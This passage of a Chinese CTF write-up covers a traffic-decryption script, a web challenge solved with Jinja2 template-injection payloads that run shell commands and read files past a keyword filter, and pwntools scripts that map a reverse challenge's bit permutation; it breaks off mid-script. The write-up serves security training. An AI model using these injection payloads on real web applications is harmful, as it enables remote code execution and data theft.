cipher = AES.new(self.aeskey, AES.MODE_CBC, CS_FIXED_IV)</span><br><span class="line">        encryptedData = cipher.encrypt(data)</span><br><span class="line">        hmacSignatureCalculated = hmac.new(self.hmackey, encryptedData, hashlib.sha256).digest()[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">return</span> encryptedData + hmacSignatureCalculated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">input_filename, output_filename, rawkey</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密文件内容</span></span><br><span class="line"><span class="string">    :param input_filename: 输入加密文件</span></span><br><span class="line"><span class="string">    :param output_filename: 输出解密后的文件</span></span><br><span class="line"><span class="string">    :param rawkey: 用于解密的原始密钥</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 创建解密对象</span></span><br><span class="line">    crypto = cCrypto(rawkey=rawkey)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取文件数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密数据</span></span><br><span class="line">    decrypted_data = crypto.Decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入解密后的数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted data written to <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密文件</span></span><br><span class="line">input_filename = <span class="string">&#x27;123.vir&#x27;</span>	<span class="comment"># 提取的请求，提前删除了http头</span></span><br><span class="line">output_filename = <span class="string">&#x27;out.pcap&#x27;</span>  <span class="comment"># 解密后的文件保存路径</span></span><br><span class="line">rawkey = <span class="string">&#x27;28ab951fc96bcb93ec13cf9dd5f21373&#x27;</span>  <span class="comment"># 用于解密的密钥</span></span><br><span class="line"></span><br><span class="line">decrypt_file(input_filename, output_filename, rawkey)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提取出来后还是找不到flag，看起来是个流量包</p>
<p><del>比赛时间到了，看看后面有没有其他师傅出了</del> </p>
<h3 id="赛后-1"><a href="#赛后-1" class="headerlink" title="赛后"></a>赛后</h3><p>已经有师傅出了，链接在下面</p>
<blockquote>
<p>参考：<a href="https://www.snowywar.top/4527.html">https://www.snowywar.top/4527.html</a></p>
</blockquote>
<h2 id="Web-Rank-I-Ron"><a href="#Web-Rank-I-Ron" class="headerlink" title="[Web] Rank-I | @Ron"></a>[Web] Rank-I | @Ron</h2><p>尝试rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls ..&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flagf149</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

<p>得知根目录下有flagf149文件应该是flag，直接读取读不了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;open(&quot;app.py&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>拿到源代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, abort</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">phone = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_input</span>(<span class="params">user_input</span>):</span><br><span class="line">    <span class="comment"># unsafe_keywords = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;import&#x27;, &#x27;__import__&#x27;]</span></span><br><span class="line">    unsafe_keywords = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;awd&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%2f&#x27;</span>,<span class="string">&#x27;%2F&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> user_input <span class="keyword">for</span> keyword <span class="keyword">in</span> unsafe_keywords):</span><br><span class="line">    <span class="comment"># if user_input in unsafe_keywords:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> phone</span><br><span class="line">    phone = request.form.get(<span class="string">&quot;phone_number&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cpass&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    <span class="keyword">global</span> phone</span><br><span class="line">    password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_safe_input(phone):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> phone != <span class="string">&quot;1686682318&quot;</span> <span class="keyword">and</span> password != <span class="string">&quot;Happy_news_admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;!DOCTYPE html&gt;\</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;\</span></span><br><span class="line"><span class="string">        &lt;head&gt;\</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;\</span></span><br><span class="line"><span class="string">            &lt;title&gt;login failed&lt;/title&gt;\</span></span><br><span class="line"><span class="string">        &lt;/head&gt;\</span></span><br><span class="line"><span class="string">        &lt;body&gt;\</span></span><br><span class="line"><span class="string">            &lt;script&gt;alert(&quot;&#123;&#125;The number does not exist or the password is incorrect!&quot;) &lt;/script&gt;\</span></span><br><span class="line"><span class="string">            &lt;script&gt;window.location.href = &quot;/&quot;;&lt;/script&gt;\</span></span><br><span class="line"><span class="string">        &lt;/body&gt;\</span></span><br><span class="line"><span class="string">        &lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(phone))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="built_in">int</span>(<span class="string">&quot;5005&quot;</span>), debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>查看源码发现过滤了<code>[&#39;flag&#39;,&#39;?&#39;,&#39;*&#39;,&#39;-&#39;,&#39;less&#39;,&#39;nl&#39;,&#39;tac&#39;,&#39;more&#39;,&#39;tail&#39;,&#39;od&#39;,&#39;grep&#39;,&#39;awd&#39;,&#39;sed&#39;,&#39;64&#39;,&#39;/&#39;,&#39;%2f&#39;,&#39;%2F&#39;]</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;open(chr(47)+&quot;fla&quot;+&quot;gf149&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<blockquote>
<p>DASCTF{49467766377144059055627981055717}</p>
</blockquote>
<h2 id="Reverse-BitDance-Jeremiah"><a href="#Reverse-BitDance-Jeremiah" class="headerlink" title="[Reverse] BitDance | @Jeremiah"></a>[Reverse] BitDance | @Jeremiah</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 设置日志级别为调试，以便看到详细的调试信息</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># 初始长度</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 连接到远程服务器</span></span><br><span class="line">        p = remote(<span class="string">&#x27;139.155.126.78&#x27;</span>, <span class="number">16335</span>)</span><br><span class="line">        <span class="comment"># 发送由 &#x27;1&#x27; 重复 i 次组成的字符串</span></span><br><span class="line">        payload = <span class="string">b&#x27;1&#x27;</span> * i</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Welcome to dance:&#x27;</span>, payload)</span><br><span class="line">        <span class="comment"># 接收服务器的响应</span></span><br><span class="line">        response = p.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Sent <span class="subst">&#123;i&#125;</span> &#x27;1&#x27;s, received: <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 检查响应是否不是 &quot;Wrong length&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Wrong length&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Success! Correct length found: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="comment"># 如果需要，可以在此处进一步处理响应</span></span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 退出循环</span></span><br><span class="line">        <span class="comment"># 关闭当前连接</span></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># 增加发送长度</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection closed by remote server at length <span class="subst">&#123;i&#125;</span>.&quot;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred at length <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/202501181618881.png"></p>
<p>题目是一个靶机，连上之后会出现<code>welcome to dance</code>,等待用户输入并判断输入的长度，错误会返回<code>Wrong length</code>,所以第一步先爆破了输入的长度，爆破得到长度为<strong>96</strong><br>并且会返回<code>Start from 0</code>,后面还会返回非常多的hex数据，转换成ascll是大量的0和1，如图，大部分都是这种，需要关注的是红色字符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/202501181624075.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/202501181624330.png"></p>
<p>最后一段是<code>Check in with</code> 后面跟的应该就是密文，计算了一下密文的长度是<strong>768</strong>,刚好是96的<strong>8</strong>倍，再结合上面的01不难猜出是将我们的输入转成了8位二进制数进行判断，但是密文从二进制转成ascll之后并不是可见字符，说明校验中间会进行一层变换，现在要逆这个变换，前面提到的红色字符的生成方式是这样的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/202501181658023.png"></p>
<p>所以我们要提取出红色字符对应的值并拼接成一个字符串，总共是<strong>768</strong>位，与密文长度一致，其实就是我们输入的数据，我们需要发送多次数据进行对比，每次只改变一个位置的字符，并找出输入-&gt;输出的对应关系<br>这样就能找到输入和输出的映射关系，需要利用<strong>7</strong>个不同的字符来得到完整的映射关系表，下面分成了两个脚本来跑得到最后完整的映射表，第一个得到<code>offset = 2...7</code>的映射关系，第二个得到<code>offset = 1</code>的映射关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_binary</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_diff</span>(<span class="params">a, b</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[i] != b[i]:</span><br><span class="line">            <span class="built_in">print</span>(i, a[i], b[i])</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encode_string</span>(<span class="params">send</span>):</span><br><span class="line">    result = [<span class="number">2</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">768</span>)]</span><br><span class="line">    p = remote(<span class="string">&#x27;139.155.126.78&#x27;</span>, <span class="number">16335</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Welcome to dance:&#x27;</span>, send.encode())</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">768</span>):</span><br><span class="line">        line = p.recvline().replace(<span class="string">b&#x27;\x1b[0;32m&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x1b[0m\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        pos = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)) <span class="keyword">if</span> line[i:i + <span class="number">11</span>] == <span class="string">b&#x27;\x1b[0m\x1b[0;31m&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">        result[pos] = <span class="built_in">chr</span>(line[pos + <span class="number">11</span>])</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_single_character</span>(<span class="params">i, char, encode_base</span>):</span><br><span class="line">    send = <span class="string">&#x27;9&#x27;</span> * i + char + <span class="string">&#x27;9&#x27;</span> * (<span class="number">95</span> - i)</span><br><span class="line">    encode = get_encode_string(send)</span><br><span class="line">    diff = char_diff(encode_base, encode)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(diff) == <span class="number">1</span></span><br><span class="line">    num = i * <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num, diff[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    change_map = &#123;<span class="number">2</span>: <span class="number">523</span>, <span class="number">3</span>: <span class="number">100</span>, <span class="number">4</span>: <span class="number">295</span>, <span class="number">5</span>: <span class="number">435</span>, <span class="number">6</span>: <span class="number">168</span>, <span class="number">7</span>: <span class="number">199</span>, <span class="number">10</span>: <span class="number">310</span>, <span class="number">11</span>: <span class="number">744</span>, <span class="number">12</span>: <span class="number">127</span>, <span class="number">13</span>: <span class="number">254</span>, <span class="number">14</span>: <span class="number">623</span>, <span class="number">15</span>: <span class="number">221</span>, <span class="number">18</span>: <span class="number">625</span>, <span class="number">19</span>: <span class="number">316</span>, <span class="number">20</span>: <span class="number">731</span>, <span class="number">21</span>: <span class="number">635</span>, <span class="number">22</span>: <span class="number">718</span>, <span class="number">23</span>: <span class="number">229</span>, <span class="number">26</span>: <span class="number">438</span>, <span class="number">27</span>: <span class="number">12</span>, <span class="number">28</span>: <span class="number">99</span>, <span class="number">29</span>: <span class="number">503</span>, <span class="number">30</span>: <span class="number">136</span>, <span class="number">31</span>: <span class="number">204</span>, <span class="number">34</span>: <span class="number">241</span>, <span class="number">35</span>: <span class="number">526</span>, <span class="number">36</span>: <span class="number">621</span>, <span class="number">37</span>: <span class="number">450</span>, <span class="number">38</span>: <span class="number">491</span>, <span class="number">39</span>: <span class="number">24</span>, <span class="number">42</span>: <span class="number">734</span>, <span class="number">43</span>: <span class="number">125</span>, <span class="number">44</span>: <span class="number">719</span>, <span class="number">45</span>: <span class="number">406</span>, <span class="number">46</span>: <span class="number">209</span>, <span class="number">47</span>: <span class="number">458</span>, <span class="number">50</span>: <span class="number">519</span>, <span class="number">51</span>: <span class="number">263</span>, <span class="number">52</span>: <span class="number">504</span>, <span class="number">53</span>: <span class="number">403</span>, <span class="number">54</span>: <span class="number">22</span>, <span class="number">55</span>: <span class="number">142</span>, <span class="number">58</span>: <span class="number">400</span>, <span class="number">59</span>: <span class="number">274</span>, <span class="number">60</span>: <span class="number">547</span>, <span class="number">61</span>: <span class="number">657</span>, <span class="number">62</span>: <span class="number">611</span>, <span class="number">63</span>: <span class="number">107</span>, <span class="number">66</span>: <span class="number">559</span>, <span class="number">67</span>: <span class="number">697</span>, <span class="number">68</span>: <span class="number">228</span>, <span class="number">69</span>: <span class="number">660</span>, <span class="number">70</span>: <span class="number">545</span>, <span class="number">71</span>: <span class="number">757</span>, <span class="number">74</span>: <span class="number">477</span>, <span class="number">75</span>: <span class="number">665</span>, <span class="number">76</span>: <span class="number">307</span>, <span class="number">77</span>: <span class="number">448</span>, <span class="number">78</span>: <span class="number">662</span>, <span class="number">79</span>: <span class="number">566</span>, <span class="number">82</span>: <span class="number">466</span>, <span class="number">83</span>: <span class="number">462</span>, <span class="number">84</span>: <span class="number">645</span>, <span class="number">85</span>: <span class="number">451</span>, <span class="number">86</span>: <span class="number">215</span>, <span class="number">87</span>: <span class="number">317</span>, <span class="number">90</span>: <span class="number">285</span>, <span class="number">91</span>: <span class="number">716</span>, <span class="number">92</span>: <span class="number">601</span>, <span class="number">93</span>: <span class="number">106</span>, <span class="number">94</span>: <span class="number">646</span>, <span class="number">95</span>: <span class="number">712</span>, <span class="number">98</span>: <span class="number">126</span>, <span class="number">99</span>: <span class="number">232</span>, <span class="number">100</span>: <span class="number">380</span>, <span class="number">101</span>: <span class="number">622</span>, <span class="number">102</span>: <span class="number">364</span>, <span class="number">103</span>: <span class="number">677</span>, <span class="number">106</span>: <span class="number">405</span>, <span class="number">107</span>: <span class="number">641</span>, <span class="number">108</span>: <span class="number">460</span>, <span class="number">109</span>: <span class="number">654</span>, <span class="number">110</span>: <span class="number">203</span>, <span class="number">111</span>: <span class="number">84</span>, <span class="number">114</span>: <span class="number">537</span>, <span class="number">115</span>: <span class="number">683</span>, <span class="number">116</span>: <span class="number">674</span>, <span class="number">117</span>: <span class="number">492</span>, <span class="number">118</span>: <span class="number">498</span>, <span class="number">119</span>: <span class="number">372</span>, <span class="number">122</span>: <span class="number">546</span>, <span class="number">123</span>: <span class="number">167</span>, <span class="number">124</span>: <span class="number">256</span>, <span class="number">125</span>: <span class="number">50</span>, <span class="number">126</span>: <span class="number">760</span>, <span class="number">127</span>: <span class="number">386</span>, <span class="number">130</span>: <span class="number">515</span>, <span class="number">131</span>: <span class="number">181</span>, <span class="number">132</span>: <span class="number">570</span>, <span class="number">133</span>: <span class="number">284</span>, <span class="number">134</span>: <span class="number">721</span>, <span class="number">135</span>: <span class="number">587</span>, <span class="number">138</span>: <span class="number">246</span>, <span class="number">139</span>: <span class="number">581</span>, <span class="number">140</span>: <span class="number">379</span>, <span class="number">141</span>: <span class="number">346</span>, <span class="number">142</span>: <span class="number">123</span>, <span class="number">143</span>: <span class="number">722</span>, <span class="number">146</span>: <span class="number">725</span>, <span class="number">147</span>: <span class="number">694</span>, <span class="number">148</span>: <span class="number">767</span>, <span class="number">149</span>: <span class="number">499</span>, <span class="number">150</span>: <span class="number">440</span>, <span class="number">151</span>: <span class="number">447</span>, <span class="number">154</span>: <span class="number">705</span>, <span class="number">155</span>: <span class="number">575</span>, <span class="number">156</span>: <span class="number">425</span>, <span class="number">157</span>: <span class="number">608</span>, <span class="number">158</span>: <span class="number">583</span>, <span class="number">159</span>: <span class="number">512</span>, <span class="number">162</span>: <span class="number">755</span>, <span class="number">163</span>: <span class="number">663</span>, <span class="number">164</span>: <span class="number">507</span>, <span class="number">165</span>: <span class="number">399</span>, <span class="number">166</span>: <span class="number">698</span>, <span class="number">167</span>: <span class="number">337</span>, <span class="number">170</span>: <span class="number">624</span>, <span class="number">171</span>: <span class="number">382</span>, <span class="number">172</span>: <span class="number">648</span>, <span class="number">173</span>: <span class="number">299</span>, <span class="number">174</span>: <span class="number">439</span>, <span class="number">175</span>: <span class="number">329</span>, <span class="number">178</span>: <span class="number">29</span>, <span class="number">179</span>: <span class="number">210</span>, <span class="number">180</span>: <span class="number">538</span>, <span class="number">181</span>: <span class="number">140</span>, <span class="number">182</span>: <span class="number">673</span>, <span class="number">183</span>: <span class="number">388</span>, <span class="number">186</span>: <span class="number">738</span>, <span class="number">187</span>: <span class="number">113</span>, <span class="number">188</span>: <span class="number">314</span>, <span class="number">189</span>: <span class="number">325</span>, <span class="number">190</span>: <span class="number">69</span>, <span class="number">191</span>: <span class="number">112</span>, <span class="number">194</span>: <span class="number">555</span>, <span class="number">195</span>: <span class="number">289</span>, <span class="number">196</span>: <span class="number">432</span>, <span class="number">197</span>: <span class="number">656</span>, <span class="number">198</span>: <span class="number">765</span>, <span class="number">199</span>: <span class="number">81</span>, <span class="number">202</span>: <span class="number">149</span>, <span class="number">203</span>: <span class="number">111</span>, <span class="number">204</span>: <span class="number">85</span>, <span class="number">205</span>: <span class="number">610</span>, <span class="number">206</span>: <span class="number">170</span>, <span class="number">207</span>: <span class="number">586</span>, <span class="number">210</span>: <span class="number">390</span>, <span class="number">211</span>: <span class="number">710</span>, <span class="number">212</span>: <span class="number">281</span>, <span class="number">213</span>: <span class="number">630</span>, <span class="number">214</span>: <span class="number">480</span>, <span class="number">215</span>: <span class="number">419</span>, <span class="number">218</span>: <span class="number">352</span>, <span class="number">219</span>: <span class="number">476</span>, <span class="number">220</span>: <span class="number">293</span>, <span class="number">221</span>: <span class="number">527</span>, <span class="number">222</span>: <span class="number">593</span>, <span class="number">223</span>: <span class="number">0</span>, <span class="number">226</span>: <span class="number">375</span>, <span class="number">227</span>: <span class="number">8</span>, <span class="number">228</span>: <span class="number">133</span>, <span class="number">229</span>: <span class="number">166</span>, <span class="number">230</span>: <span class="number">83</span>, <span class="number">231</span>: <span class="number">354</span>, <span class="number">234</span>: <span class="number">344</span>, <span class="number">235</span>: <span class="number">313</span>, <span class="number">236</span>: <span class="number">334</span>, <span class="number">237</span>: <span 